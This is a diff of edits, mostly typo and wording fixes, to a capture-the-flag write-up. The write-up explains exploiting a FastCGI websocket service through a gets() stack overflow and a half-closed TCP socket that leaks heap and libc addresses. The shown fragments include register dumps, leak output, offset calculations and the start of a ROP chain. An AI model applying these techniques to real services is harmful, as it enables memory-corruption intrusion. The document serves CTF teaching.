@@ -139,9 +139,9 @@ This changes the flow the following way:
 So instead of carefully buffering every request we now have a full duplex connection to the client. If this happens it messes with some guarantees that are usually expected from FastCGI. Notably it is possible to receive data even if `CONTENT_LENGTH` isn't set. So how can we exploit this?
 
 ## Vulnerabilities
-The first vulnerability should seems obvious. We upgrade every client that requests it to a websocket. This is a problem because our `/api/boost` endpoint allocates a buffer on stack using the `CONTENT_LENGTH` environment variable and `gets()`. Even though suboptimal this function would usually be safe, because you can't receive more data than `CONTENT_LENGTH`. But because we upgraded to websockets we lost this guarantee.
+The first vulnerability should seems obvious. We upgrade every client that requests it to a websocket. This is a problem because our `/api/boost` endpoint allocates a buffer on stack using the `CONTENT_LENGTH` environment variable and `gets()` it. Even though suboptimal this function would usually be safe, because you can't receive more data than `CONTENT_LENGTH`. But because we upgraded to websockets we lost this guarantee.
 
-Fun Fact: the FastCGI library made the decision to write and port their on version of `gets()`, which behaves the same ([source](https://github.com/FastCGI-Archives/fcgi2/blob/2.4.2/libfcgi/fcgi_stdio.c#L488)). 
+Fun Fact: the FastCGI library made the decision to write and port their on version of `gets()`, which behaves the same way ([source](https://github.com/FastCGI-Archives/fcgi2/blob/2.4.2/libfcgi/fcgi_stdio.c#L488)). 
 
 Note: actually there is another vulnerability, notable there is a one null byte BOF due to `gets()`, but that shouldn't be enough for exploitation.
 
@@ -186,14 +186,14 @@ Also if we specify the opcode `PING` or `PONG` our frame is just echoed back.
 
 Everyone familiar with heap exploitation knows that this is a prime target to get memory leaks and defeat ASLR for the libc and heap memory regions (e.g. through leaking the linked list pointers of large bins). So how do we make `fread()` terminate early?
 
-TCP allows us to only close the writing end of a socket using the `shutdown(SHUT_WR)` syscall (`t.shutdown('send')` in pwntools) and turning it into a simplex connection. This means `fread()` will terminate early as it reaches and EOF and terminate allowing use to leak memory.
+TCP allows us to only close the writing end of a socket using the `shutdown(SHUT_WR)` syscall (`t.shutdown('send')` in pwntools) and turning it into a simplex connection. This means `fread()` will terminate early as it reaches an EOF and terminate allowing us to leak memory.
 
 
-Note: Half-Open connections aren't support by SSL, so one way to prevent such an attack on other services would be to use SSL for all services.
+Note: Half-Open connections aren't supported by SSL, so one way to prevent such an attack on other services would be to use SSL.
 
 
 ## Exploitation
-So now that we know the vulnerabilities how do we properly chain and exploit them? First let's define some helper functions that allows us to do HTTP requests through pwntools:
+So now that we know the vulnerabilities how do we properly chain and exploit them? First let's define some helper functions that allow us to do HTTP requests through pwntools:
 
 Note: i use a bunch of aliases, a full list can be found [here](https://gist.github.com/gfelber/e213e0822b8c96da701fd39c8784e1c2)
 
@@ -298,24 +298,7 @@ se(cyc(0x60) + b'\n')
 and we get a lot of control
 ```
 (gdb) i reg
-x0             0x1d                29
-x1             0x0                 0
-x2             0x0                 0
-x3             0xaaaae1102d50      187650897096016
-x4             0xaaaae1102d55      187650897096021
-x5             0xaaaaf81ec6aa      187651283928746
-x6             0x2aaab8440b4e0     750603588383968
-x7             0x9                 9
-x8             0x101010101010101   72340172838076673
-x9             0xffff9f0aeb28      281473350036264
-x10            0xffff9ea30fd8      281473343229912
-x11            0x0                 0
-x12            0xffff9f0b0370      281473350042480
-x13            0xffffe573b560      281474531308896
-x14            0x1                 1
-x15            0x3b8a5c4           62432708
-x16            0xffff9ea4fc08      281473343355912
-x17            0xffff9e8630c0      281473341337792
+...
 x18            0x0                 0
 x19            0x6161616661616165  7016996786768273765
 x20            0x6161616861616167  7016996795358208359
@@ -338,9 +321,9 @@ tpidr          0xffff9f0a2740      0xffff9f0a2740
 tpidr2         0x0                 0x0
 ```
 
-Note: i hate some issues in my debug setup with [pwndbg](https://github.com/pwndbg/pwndbg) so i fell back to plain gdb, which is more than enough for a simple ROP chain.
+Note: i had some issues in my debug setup with [pwndbg](https://github.com/pwndbg/pwndbg) so i fell back to plain gdb, which is more than enough for a simple ROP chain.
 
-So next lets write a PoC for getting a leak. Our plan is to allocate something outside of the tcache range (e.g. `0x410`), which gets freed. If we now reallocate into the same memory region (using) while closing the writing end of the socket, we successfully leak
+So next lets write a PoC for getting a leak. Our plan is to create a large bin and outside tcache-range so we allocate `0x410`, which gets freed. 
 
 
 ```python
@@ -362,7 +345,8 @@ linfo(f'leak:\n%s', hexdump(leak))
 cl(t)
 ```
 
-and we get our leak output containing a heap (`0xaaaa...`) and libc (`0xffff...`) address:
+If we now reallocate into the same memory region while closing the writing end of the socket, we successfully leak heap (`0xaaaa...`) and libc (`0xffff...`) addresses:
+
 ```
 [*] leak:                                                                                                                                                                                                                              
     00000000  10 10 97 9e  ff ff 00 00  10 10 97 9e  ff ff 00 00  │····│····│····│····│                                                                                                                                                
@@ -378,7 +362,9 @@ libc.address = u64(leak[0x00:0x08]) - 0x1b1010
 HEAP = u64(leak[0x10:0x18]) - 0x35f20
 ```
 
-Now we just have to write our ROP Chain, because we have a lot of control over registers and HEAP leak it is rather straight forward to find gadgets:
+Note: a longer hostname e.g. `127.000.00.1:8080` will take up more heap memory than `127.0.0.1:8080` slightly changing the offset.
+
+Now we just have to write our ROP Chain, because we have a lot of control over registers and a HEAP leak it is rather straight forward to find gadgets:
 
 ```python
 # hide a command on the heap on a known address due to leak
